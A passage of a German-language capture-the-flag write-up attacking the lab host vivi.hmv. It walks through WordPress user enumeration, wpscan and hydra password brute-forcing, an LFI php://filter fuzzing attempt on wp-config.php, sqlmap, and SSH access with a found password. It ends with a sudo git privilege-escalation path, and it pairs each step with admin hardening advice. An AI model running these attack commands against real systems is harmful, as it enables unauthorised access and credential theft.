+      "96": "http://2.gravatar.com/avatar/e454f0d5fc9abacb5cb29fc76290a2c9?s=96&d=mm&r=g"
+    },
+    "meta": [],
+    "_links": {
+      "self": [
+        {
+          "href": "http://vivi.hmv/wordpress/index.php/wp-json/wp/v2/users/1"
+        }
+      ],
+      "collection": [
+        {
+          "href": "http://vivi.hmv/wordpress/index.php/wp-json/wp/v2/users"
+        }
+      ]
+    }
+  }
+]
+                     </pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Der WordPress REST API Endpunkt `/wp-json/wp/v2/users` wird abgefragt. Dieser Endpunkt listet standardmäßig öffentlich sichtbare Informationen über registrierte Benutzer der WordPress-Seite auf.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Ein Benutzer mit dem Namen bzw. Slug `sancelisso` (ID 1) wurde erfolgreich enumeriert. Dies ist ein valider Benutzername für die WordPress-Instanz. Die URL `http://192.168.177.133/wordpress` im Benutzerprofil könnte auf eine interne IP-Adresse oder eine Entwicklungsumgebung hinweisen, ist aber für den direkten Angriff weniger relevant als der Benutzername selbst.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwenden Sie den gefundenen Benutzernamen `sancelisso` für Brute-Force-Angriffe auf die WordPress-Login-Seite (`wp-login.php`) oder `xmlrpc.php`.
+            <br><strong>Empfehlung (Admin):</strong> Der REST API Endpunkt zur Benutzerauflistung kann oft deaktiviert oder eingeschränkt werden, wenn er nicht benötigt wird, um die Enumeration von Benutzernamen zu erschweren. Dies kann über Sicherheitsplugins oder benutzerdefinierten Code geschehen.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">[Manual Browser Interaction / Login Attempt]</div>
+                     <pre>
+# Ziel-URL: http://vivi.hmv/wordpress/wp-login.php
+# Versuchter Login: sancelisso / [beliebiges Passwort]
+
+# Antwort (Fehlermeldung auf der Webseite):
+Error: The password you entered for the username sancelisso is incorrect. Lost your password?
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Es wird manuell versucht, sich auf der WordPress-Loginseite (`wp-login.php`) mit dem zuvor enumerierten Benutzernamen `sancelisso` und einem falschen Passwort anzumelden.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die Fehlermeldung "The password you entered for the username sancelisso is incorrect" bestätigt explizit, dass der Benutzername `sancelisso` existiert, aber das Passwort falsch ist. Dies ist eine nützliche Bestätigung, die für Brute-Force-Angriffe verwendet werden kann.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führen Sie einen Passwort-Brute-Force-Angriff gegen den Benutzer `sancelisso` durch, z.B. mit `wpscan` oder `hydra`.
+             <br><strong>Empfehlung (Admin):</strong> Konfigurieren Sie WordPress so, dass es bei fehlgeschlagenen Logins keine Auskunft darüber gibt, ob der Benutzername oder das Passwort falsch war (z.B. durch eine generische Fehlermeldung wie "Invalid login credentials"). Implementieren Sie Rate Limiting oder Captchas auf der Login-Seite, um Brute-Force-Angriffe zu erschweren.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">wpscan --url http://vivi.hmv/wordpress --api-token RoBoA[...] --passwords /usr/share/wordlists/rockyou.txt --usernames sancelisso</span></div>
+                    <pre>
+_______________________________________________________________
+         __          _______   _____
+         \ \        / /  __ \ / ____|
+          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
+            \  /\  /  | |     ____) | (__| (_| | | | |
+             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+         WordPress Security Scanner by the WPScan Team
+[...]
+_______________________________________________________________
+[...]
+[+] WordPress theme in use: twentytwentyfour
+ | Location: http://vivi.hmv/wordpress/wp-content/themes/twentytwentyfour/
+ | Last Updated: 2024-04-02T00:00:00.000Z
+ | Readme: http://vivi.hmv/wordpress/wp-content/themes/twentytwentyfour/readme.txt
+ | [!] The version is out of date, the latest version is 1.1
+ | [!] Directory listing is enabled
+[...]
+ | Version: 1.0 (80% confidence)
+[...]
+[+] Performing password attack on Wp Login against 1 user/s
+[...]
+[i] No Valid Passwords Found.
+[...]
+[+] Finished: Mon May  6 22:51:03 2024
+[...]
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> `wpscan`, ein spezialisierter WordPress-Sicherheits-Scanner, wird eingesetzt.
+                <ul>
+                    <li>`--url http://vivi.hmv/wordpress`: Definiert die Ziel-WordPress-Instanz.</li>
+                    <li>`--api-token RoBoA[...]`: Ein (optionaler) API-Token für die WPScan Vulnerability Database, um aktuellere Schwachstelleninformationen abzurufen.</li>
+                    <li>`--passwords /usr/share/wordlists/rockyou.txt`: Gibt eine Passwortliste für Brute-Force-Angriffe an.</li>
+                    <li>`--usernames sancelisso`: Gibt den Zielbenutzernamen für den Passwortangriff an.</li>
+                </ul>
+            Der Scan führt eine allgemeine Enumeration durch und versucht anschließend, das Passwort für `sancelisso` mithilfe der `rockyou.txt`-Liste zu knacken.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Scan liefert zusätzliche Informationen:
+                <ul>
+                    <li>Das verwendete Theme ist `twentytwentyfour` in Version 1.0, welche als veraltet markiert wird (neueste Version 1.1). Veraltete Themes können Schwachstellen enthalten.</li>
+                    <li>Bestätigt erneut Directory Listing.</li>
+                </ul>
+            Der Passwort-Brute-Force-Angriff auf den Benutzer `sancelisso` mit der `rockyou.txt`-Liste war jedoch **erfolglos** ("No Valid Passwords Found").</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Das Passwort für `sancelisso` ist nicht in `rockyou.txt`. Versuchen Sie eventuell andere Passwortlisten oder andere Angriffsmethoden. Recherchieren Sie bekannte Schwachstellen für das Theme `twentytwentyfour` Version 1.0.
+            <br><strong>Empfehlung (Admin):</strong> Aktualisieren Sie das WordPress-Theme `twentytwentyfour` auf die neueste Version. Überwachen Sie fehlgeschlagene Login-Versuche. Stellen Sie sicher, dass Benutzer starke, einzigartige Passwörter verwenden.</p>
+
+            <!-- Hydra MySQL und wfuzz/LFI Blöcke werden hier eingefügt, da sie Teil der Web Enumeration waren, auch wenn sie fehlschlugen -->
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">hydra -l sancelisso -P /usr/share/wordlists/rockyou.txt mysql://192.168.2.117:33060 -t 64</span></div>
+                    <pre>
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak [...]
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-05-06 22:16:57
+[INF] Reduced number of tasks to 4 (mysql does not like many parallel connections)
+[WARNING] Restorefile [...] found [...]
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344498 login tries (l:1/p:14344498), ~3586125 tries per task
+[DATA] attacking mysql://192.168.2.117:33060/
+[INF] This is protocol version 11, only v10 is supported, not sure if it will work
+[INF] This is protocol version 11, only v10 is supported, not sure if it will work
+[INF] This is protocol version 11, only v10 is supported, not sure if it will work
+[INF] This is protocol version 11, only v10 is supported, not sure if it will work
+[33060][mysql] host: 192.168.2.117   login: sancelisso   password: <span class="password">s13!34g$3FVA5e@ed</span>
+[33060][mysql] host: 192.168.2.117   login: sancelisso   password: <span class="password">benni</span>
+[33060][mysql] host: 192.168.2.117   login: sancelisso   password: <span class="password">8uoio</span>
+[33060][mysql] host: 192.168.2.117   login: sancelisso   password: <span class="password">Buoio</span>
+1 of 1 target successfully completed, 4 valid passwords found
+                    </pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Es wird versucht, mit `hydra` das Passwort für den Benutzer `sancelisso` für den Dienst auf Port 33060 (vermutlich MySQL X Protocol) zu bruteforcen. Die Passwortliste `rockyou.txt` wird verwendet. Die Anzahl der parallelen Tasks (`-t 64`) wird von Hydra automatisch reduziert.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Hydra meldet **vier gefundene Passwörter**: `<span class="password">s13!34g$3FVA5e@ed</span>`, `<span class="password">benni</span>`, `<span class="password">8uoio</span>`, `<span class="password">Buoio</span>`. Allerdings gibt Hydra auch die Warnung aus: "[INF] This is protocol version 11, only v10 is supported, not sure if it will work". Dies deutet darauf hin, dass Hydra möglicherweise nicht korrekt mit dem MySQL X Protocol auf Port 33060 kommunizieren kann und die gefundenen Passwörter **falsch-positiv** sein könnten. Es ist ungewöhnlich, dass Hydra vier gültige Passwörter für einen einzigen Benutzer meldet, was die Vermutung eines Fehlers stärkt.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Behandeln Sie die gefundenen Passwörter mit Vorsicht. Versuchen Sie, sich manuell mit einem Client, der MySQL X Protocol unterstützt, und diesen Passwörtern zu verbinden, um sie zu validieren. Da die Unterstützung in Hydra fraglich ist, sind diese Ergebnisse wahrscheinlich nicht zuverlässig. Konzentrieren Sie sich auf andere Angriffsvektoren.
+             <br><strong>Empfehlung (Admin):</strong> Überprüfen Sie die Konfiguration des Dienstes auf Port 33060. Wenn es sich um MySQL X handelt, stellen Sie sicher, dass starke Passwörter verwendet werden und der Zugriff beschränkt ist. Deaktivieren Sie den Dienst, wenn er nicht benötigt wird. Implementieren Sie Intrusion-Prevention-Systeme (IPS), um Brute-Force-Angriffe zu erkennen und zu blockieren.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u "http://vivi.hmv/wordpress/wp-content/themes/twentytwentyfour/functions.php?FUZZ=php://filter/convert.base64-encode/resource=wp-config.php" --hc 404 --hh 0</span></div>
+                     <pre>
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://vivi.hmv/wordpress/wp-content/themes/twentytwentyfour/functions.php?FUZZ=php://filter/convert.base64-encode/resource=wp-config.php
+Total requests: 220547
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+
+Total time: [...]
+Processed Requests: 220547
+Filtered Requests: 220547
+Requests/sec.: [...]
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Es wird versucht, mit `wfuzz` eine Local File Inclusion (LFI) Schwachstelle auszunutzen. Die URL zielt auf die `functions.php` des `twentytwentyfour`-Themes. Es wird versucht, über einen Parameter (dessen Name mit der Wordlist gefuzzt wird: `FUZZ`) den PHP-Wrapper `php://filter` zu verwenden, um den Inhalt der Datei `wp-config.php` Base64-kodiert auszulesen. `--hc 404` blendet 404-Fehler aus, `--hh 0` blendet Antworten mit 0 Zeichen aus.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Der Scan liefert keine Ergebnisse (Filtered Requests = Processed Requests). Dies deutet darauf hin, dass entweder keine LFI-Schwachstelle über einen Parameter mit einem Namen aus der verwendeten Wordlist existiert oder dass die `functions.php` nicht anfällig ist oder dass der Zugriff auf `wp-config.php` auf andere Weise blockiert wird. Zuvor gab es bereits einen Hinweis auf einen 500 Internal Server Error beim Zugriff auf `functions.php` im `wpscan`-Output, was auf ein Problem mit der Datei oder der Serverkonfiguration hindeuten könnte.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Dieser spezifische LFI-Versuch war erfolglos. Untersuchen Sie den 500-Fehler bei `functions.php` genauer. Testen Sie andere potenzielle LFI-Vektoren oder andere Schwachstellen im Theme `twentytwentyfour` v1.0.
+             <br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass PHP-Einstellungen wie `allow_url_include` deaktiviert sind. Validieren und sanitisieren Sie alle Benutzereingaben, insbesondere solche, die in Dateipfade oder `include`/`require`-Anweisungen einfließen könnten. Halten Sie Themes und Plugins aktuell.</p>
+
+             <!-- SQLMap Versuch -->
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">sqlmap -r /home/cyber/Downloads/benni.sql --dbs --batch --level 3 --risk 3</span></div>
+                     <pre>
+[...]
+sqlmap/1.8.3#stable (https://sqlmap.org)
+[...]
+[22:44:10] [INFO] testing connection to the target URL
+[22:44:10] [INFO] checking if the target is protected by some kind of WAF/IPS
+[22:44:10] [INFO] testing if the target URL content is stable
+[22:44:10] [INFO] target URL content is stable
+[22:44:10] [INFO] testing if GET parameter 'username' is dynamic
+[22:44:10] [INFO] GET parameter 'username' is dynamic
+[22:44:10] [INFO] heuristic (basic) test shows that GET parameter 'username' might not be injectable
+[22:44:10] [INFO] testing for SQL injection on GET parameter 'username'
+[...]
+[22:44:11] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
+[22:44:11] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
+[...]
+[22:44:11] [WARNING] parameter 'Referer' does not seem to be injectable
+[22:44:11] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
+[22:44:11] [WARNING] HTTP error codes detected during run:
+400 (Bad Request) - 6906 times
+
+[*] ending @ 22:44:11 /2024-05-06/
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> `sqlmap` wird erneut ausgeführt, diesmal mit einer Request-Datei namens `benni.sql` (vermutlich ein anderer Request als zuvor, möglicherweise ein GET-Request mit dem Parameter `username`). Es wird versucht, Datenbanken (`--dbs`) aufzulisten, im Batch-Modus (`--batch`) und mit erhöhter Testtiefe (`--level 3 --risk 3`).</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Der Scan scheitert. `sqlmap` findet keine injizierbaren Parameter ("[CRITICAL] all tested parameters do not appear to be injectable"). Es meldet zudem eine hohe Anzahl von 400 (Bad Request) Fehlern, was darauf hindeuten könnte, dass die gesendeten Payloads vom Server oder einer Schutzmaßnahme (WAF/IPS) als ungültig abgelehnt wurden.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> SQL Injection scheint in diesem getesteten Request nicht möglich zu sein. Untersuchen Sie andere Parameter und Endpunkte der Webanwendung auf potenzielle SQLi-Schwachstellen. Berücksichtigen Sie die Möglichkeit einer Web Application Firewall (WAF), die die `sqlmap`-Tests blockiert haben könnte (`--tamper`-Skripte könnten helfen).
+             <br><strong>Empfehlung (Admin):</strong> Auch wenn dieser Scan fehlschlug, ist es entscheidend, alle Benutzereingaben serverseitig zu validieren und parametrisierte Abfragen (Prepared Statements) zu verwenden, um SQL Injection generell zu verhindern. Der Einsatz einer WAF kann eine zusätzliche Schutzschicht bieten.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">[Manual Directory Browsing / File Listing]</div>
+                     <pre>
+# Zugriff auf: http://vivi.hmv/wordpress/wp-includes/
+# Ergebnis (Auszug der Dateiliste):
+[...]
+[DIR]	rest-api/	2023-11-08 19:45 	-
+[ ]	revision.php	2023-10-23 15:56 	30K
+[ ]	rewrite.php	2023-07-11 07:15 	19K
+[ ]	robots-template.php	2022-04-06 11:33 	5.1K
+[ ]	rss-functions.php	2020-11-16 17:52 	255
+[ ]	rss.php	2024-05-06 15:53 	23K
+[ ]	script-loader.php	2024-05-06 15:53 	127K
+[ ]	script-modules.php	2024-05-06 15:53 	5.9K
+~
+[TXT]	secrets.txt	2023-12-05 16:03 	439
+~
+[ ]	session.php	2020-02-06 01:33 	258
+[ ]	shortcodes.php	2024-05-06 15:53 	23K
+[ ]	sitemaps.php	2021-05-15 13:38 	3.2K
+[...]
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Das Verzeichnis `/wordpress/wp-includes/` wird manuell durchsucht, wahrscheinlich weil Directory Listing hier ebenfalls aktiviert ist oder durch vorherige Scans bekannt war.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> **Ein kritischer Fund!** In diesem Verzeichnis, das normalerweise nur WordPress-Kerndateien enthalten sollte, befindet sich eine verdächtige Datei namens `secrets.txt`. Das Erstellungsdatum (2023-12-05) weicht von den meisten anderen Kerndateien ab. Der Name legt nahe, dass sie sensible Informationen enthält.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Laden Sie die Datei `secrets.txt` sofort herunter und analysieren Sie ihren Inhalt. Sie enthält wahrscheinlich Passwörter oder andere wichtige Hinweise.
+             <br><strong>Empfehlung (Admin):</strong> **KRITISCH!** Sensible Dateien dürfen niemals in öffentlich zugänglichen Webverzeichnissen abgelegt werden, insbesondere nicht in WordPress-Kernverzeichnissen. Entfernen Sie diese Datei sofort. Überprüfen Sie, wie diese Datei dorthin gelangt ist (Fehlkonfiguration, früherer Angriff?). Deaktivieren Sie Directory Listing für alle Verzeichnisse.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">wget http://vivi.hmv/wordpress/wp-includes/secrets.txt</span></div>
+                    <pre>
+--2024-05-06 22:49:42--  http://vivi.hmv/wordpress/wp-includes/secrets.txt
+Auflösen des Hostnamens vivi.hmv (vivi.hmv)… 192.168.2.117
+Verbindungsaufbau zu vivi.hmv (vivi.hmv)|192.168.2.117|:80 … verbunden.
+HTTP-Anforderung gesendet, auf Antwort wird gewartet … 200 OK
+Länge: 439 [text/plain]
+Wird in secrets.txt gespeichert.
+
+secrets.txt             100%[<===================>]     439  --.-KB/s    in 0s
+
+2024-05-06 22:49:42 (54,0 MB/s) - secrets.txt gespeichert [439/439]
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Die zuvor entdeckte Datei `secrets.txt` wird mit dem `wget`-Befehl vom Webserver heruntergeladen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Download war erfolgreich. Die Datei befindet sich nun zur weiteren Analyse auf dem System des Angreifers.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuchen Sie den Inhalt der heruntergeladenen `secrets.txt`-Datei.
+            <br><strong>Empfehlung (Admin):</strong> Entfernen Sie die Datei vom Server und deaktivieren Sie Directory Listing.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">cat secrets.txt</span></div>
+                    <pre>
+agonglo
+tegbesou
+paparazzi
+womenintech
+Password123
+bohicon
+agodjie
+tegbessou
+ba
+IfÃ¨
+Abomey
+Gelede
+BeninCity
+ranmiyan
+Zomadonu
+Ewuare
+Brass
+Ahosu
+Igodomigodo
+Edaiken
+lokun
+Iyoba
+Agasu
+Uzama
+Ihaminigbon
+Agbado
+lokunFestival
+voranmwen
+Eghaevbo
+EwuareII
+Egharevba
+IgueFestival
+Isienmwenro
+Ugie-lokun
+lokunworship
+Ukhurhe
+sunRiver
+Uwangue
+miammiam45
+Ewaise
+Iyekowa
+Idia
+lokunmask
+Emotan
+viaRiver
+lokunceremony
+Akenzua
+Edoculture
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Inhalt der heruntergeladenen Datei `secrets.txt` wird mit `cat` angezeigt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Datei enthält eine Liste von Wörtern, die wie eine benutzerdefinierte Passwortliste oder eine Sammlung von Begriffen (möglicherweise aus der beninischen Kultur/Geschichte, basierend auf einigen Wörtern) aussieht. Dies ist eine extrem wertvolle Entdeckung für weitere Brute-Force-Angriffe.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwenden Sie diese Liste (`secrets.txt`) als Passwortliste für Brute-Force-Angriffe gegen bekannte Benutzernamen (`sancelisso`) auf verschiedenen Diensten (WordPress Login, SSH, MySQL). Erstellen Sie auch eine Benutzerliste aus potenziellen Namen in der Datei (obwohl dies weniger wahrscheinlich ist).
+            <br><strong>Empfehlung (Admin):</strong> Löschen Sie diese Datei vom Server. Überprüfen Sie, ob eines dieser Passwörter tatsächlich für Benutzerkonten auf dem System verwendet wird, und ändern Sie diese sofort. Schulen Sie Benutzer darin, keine thematisch zusammenhängenden oder leicht erratbaren Wörter als Passwörter zu verwenden.</p>
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access</h2>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">wpscan --url http://vivi.hmv/wordpress --api-token RoBoA[...] --passwords secrets.txt --usernames sancelisso</span></div>
+                     <pre>
+_______________________________________________________________
+         __          _______   _____
+         \ \        / /  __ \ / ____|
+[...]
+_______________________________________________________________
+[...]
+[+] Performing password attack on Wp Login against 1 user/s
+Trying sancelisso / Edoculture Time: 00:00:00 <=> (48 / 48) 100.00% Time: 00:00:00
+
+[i] No Valid Passwords Found.
+[...]
+[+] Finished: Mon May  6 22:51:03 2024
+[...]
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> `wpscan` wird erneut ausgeführt, diesmal jedoch mit der benutzerdefinierten Passwortliste `secrets.txt`, um das Passwort für den WordPress-Benutzer `sancelisso` zu finden.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Auch dieser Brute-Force-Versuch mit der spezifischen Passwortliste `secrets.txt` gegen den WordPress-Login von `sancelisso` scheitert ("No Valid Passwords Found"). Das Passwort für `sancelisso` ist also weder in `rockyou.txt` noch in `secrets.txt` enthalten.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Der WordPress-Login von `sancelisso` scheint kein einfacher Brute-Force-Fall zu sein. Da wir nun eine spezifische Passwortliste (`secrets.txt`) haben, versuchen Sie diese Liste gegen andere potenzielle Benutzernamen oder andere Dienste (insbesondere SSH) zu verwenden.
+             <br><strong>Empfehlung (Admin):</strong> Obwohl dieser Angriff fehlschlug, bleiben die Empfehlungen zur Absicherung des WordPress-Logins (Rate Limiting, starke Passwörter, generische Fehlermeldungen) gültig.</p>
+
+             <div class="code-block">
+                  <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">vi user.txt</span></div>
+                      <pre>
+# Inhalt der neu erstellten user.txt Datei:
+joie
+alex
+jake
+emily
+mark
+sarah
+                      </pre>
+                  </div>
+              </div>
+              <p class="analysis"><strong>Analyse:</strong> Auf dem Angreifersystem wird eine neue Datei namens `user.txt` erstellt (oder bearbeitet) und mit einer Liste von Vornamen gefüllt (`joie`, `alex`, `jake`, `emily`, `mark`, `sarah`). Die Herkunft dieser Namen ist aus dem bisherigen Text nicht ersichtlich, möglicherweise stammen sie aus OSINT, Vermutungen oder einer anderen Quelle.</p>
+              <p class="evaluation"><strong>Bewertung:</strong> Dies ist ein vorbereitender Schritt für einen weiteren Brute-Force-Angriff. Es wird eine Liste potenzieller Benutzernamen erstellt, um diese in Kombination mit der zuvor gefundenen Passwortliste (`secrets.txt`) zu testen.</p>
+              <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwenden Sie die erstellte Benutzerliste (`user.txt`) zusammen mit der Passwortliste (`secrets.txt`) für einen Brute-Force-Angriff auf den SSH-Dienst (Port 22).
+              <br><strong>Empfehlung (Admin):</strong> Verwenden Sie keine leicht erratbaren oder gängigen Vornamen als Benutzernamen für Systemkonten. Implementieren Sie Mechanismen zur Abwehr von Brute-Force-Angriffen auf SSH (z.B. `fail2ban`, Key-basierte Authentifizierung bevorzugen).</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">hydra -L user.txt -P secrets.txt ssh://192.168.2.117:22 -t 64</span></div>
+                    <pre>
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak [...]
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-05-06 23:06:41
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 64 tasks per 1 server, overall 64 tasks, 288 login tries (l:6/p:48), ~5 tries per task
+[DATA] attacking ssh://192.168.2.117:22/
+[...]
+[22][ssh] host: 192.168.2.117   login: sarah   password: <span class="password">bohicon</span>
+
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-05-06 23:06:59
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> `hydra` wird verwendet, um einen Brute-Force-Angriff auf den SSH-Dienst (Port 22) durchzuführen.
+                <ul>
+                    <li>`-L user.txt`: Verwendet die zuvor erstellte Liste von Benutzernamen.</li>
+                    <li>`-P secrets.txt`: Verwendet die gefundene Passwortliste.</li>
+                    <li>`ssh://192.168.2.117:22`: Gibt das Zielprotokoll, die IP-Adresse und den Port an.</li>
+                    <li>`-t 64`: Versucht, 64 parallele Verbindungen zu verwenden (Hydra gibt eine Warnung aus, dass dies für SSH oft zu viel ist).</li>
+                </ul></p>
+            <p class="evaluation"><strong>Bewertung:</strong> **Erfolg!** Hydra findet eine gültige Kombination: Benutzer `sarah` mit dem Passwort `<span class="password">bohicon</span>`. Dieses Passwort stammt aus der `secrets.txt`-Datei. Dies ist der Durchbruch für den initialen Zugriff.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Melden Sie sich sofort per SSH mit den gefundenen Zugangsdaten `sarah`:`bohicon` am Zielsystem an.
+            <br><strong>Empfehlung (Admin):</strong> Ändern Sie sofort das Passwort für den Benutzer `sarah`. Überprüfen Sie, ob andere Passwörter aus `secrets.txt` auf dem System verwendet werden. Implementieren Sie `fail2ban` oder ähnliche Tools, um SSH-Brute-Force-Angriffe zu verlangsamen und zu blockieren. Erwägen Sie die Deaktivierung der passwortbasierten SSH-Authentifizierung zugunsten von Schlüsselpaaren.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ssh sarah@vivi.hmv</span></div>
+                    <pre>
+The authenticity of host 'vivi.hmv (192.168.2.117)' can't be established.
+ED25519 key fingerprint is SHA256:i4eLII3uzJGiSMrTFLLAnrihC0r7/y6uu7YMmGF7Rs.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added 'vivi.hmv' (ED25519) to the list of known hosts.
+sarah@vivi.hmv's password: <span class="password">bohicon</span>
+Linux VivifyTech 6.1.0-13-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.55-1 (2023-09-29) x86_64
+
+ ##################################
+ # 	Welcome to VivifyTech !      #
+ # 	The place to be :)	     #
+ ##################################
+
+Last login: Tue Dec  5 17:54:16 2023 from 192.168.177.129
+sarah@VivifyTech:~$
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Es wird eine SSH-Verbindung zum Zielsystem `vivi.hmv` als Benutzer `sarah` mit dem zuvor durch Hydra gefundenen Passwort `<span class="password">bohicon</span>` hergestellt. Der SSH-Host-Schlüssel wird beim ersten Verbindungsaufbau bestätigt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Login ist erfolgreich! Wir haben nun eine interaktive Shell auf dem Zielsystem als Benutzer `sarah`. Die Willkommensnachricht und der Prompt `sarah@VivifyTech:~$` bestätigen den Zugriff. Die Initial-Access-Phase ist abgeschlossen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Beginnen Sie mit der lokalen Enumeration auf dem Zielsystem als Benutzer `sarah`. Überprüfen Sie die Benutzerrechte (`id`, `sudo -l`), suchen Sie nach der User-Flagge (oft in `~` oder `/home/sarah`), und sammeln Sie Informationen für die Privilege Escalation.
+            <br><strong>Empfehlung (Admin):</strong> Ändern Sie das Passwort für `sarah`. Überprüfen Sie die SSH-Logs auf den erfolgreichen Login und vorherige fehlgeschlagene Versuche. Analysieren Sie die Berechtigungen des Benutzers `sarah`.</p>
+        </section>
+
+        <section id="poc">
+             <h2>Proof of Concept (Privilege Escalation Path)</h2>
+             <p class="analysis"><strong>Analyse:</strong> Nach dem Erhalt einer Shell als Benutzer `sarah` suchen wir nach Wegen, unsere Rechte zu erhöhen. Ein wichtiger Schritt ist die Suche nach versteckten oder ungewöhnlichen Dateien im Home-Verzeichnis und die Überprüfung der `sudo`-Berechtigungen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Im Home-Verzeichnis von `sarah` wurde eine versteckte Datei `.private/Tasks.txt` gefunden. Der Inhalt dieser Datei enthielt Zugangsdaten für einen anderen Benutzer: `gbodja`:`4Tch055ouy370N`. Durch den Wechsel zu diesem Benutzer (`su gbodja`) und die anschließende Überprüfung seiner `sudo`-Rechte (`sudo -l`) wurde festgestellt, dass `gbodja` den Befehl `/usr/bin/git` ohne Passwort als jeder Benutzer (`ALL`) ausführen darf. Laut GTFOBins kann `git` bei entsprechenden `sudo`-Rechten zur Privilege Escalation missbraucht werden, indem es eine Shell mit den Rechten des Zielbenutzers (in diesem Fall `root`) startet.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nutzen Sie die `sudo`-Berechtigung für `git`, um eine Root-Shell zu erlangen. Recherchieren Sie die spezifischen Befehle auf GTFOBins für die `git`-Privilege-Escalation.
+             <br><strong>Empfehlung (Admin):</strong> **KRITISCH!** Entfernen Sie sensible Informationen wie Zugangsdaten aus Klartextdateien. Überprüfen Sie die `sudoers`-Konfiguration gründlich. Die Berechtigung für `gbodja`, `git` als `root` auszuführen, ist extrem gefährlich und muss entfernt oder stark eingeschränkt werden. Weisen Sie `sudo`-Rechte nur für absolut notwendige Befehle zu und vermeiden Sie generische Tools wie `git`, `find`, `vim`, etc., wenn möglich.</p>
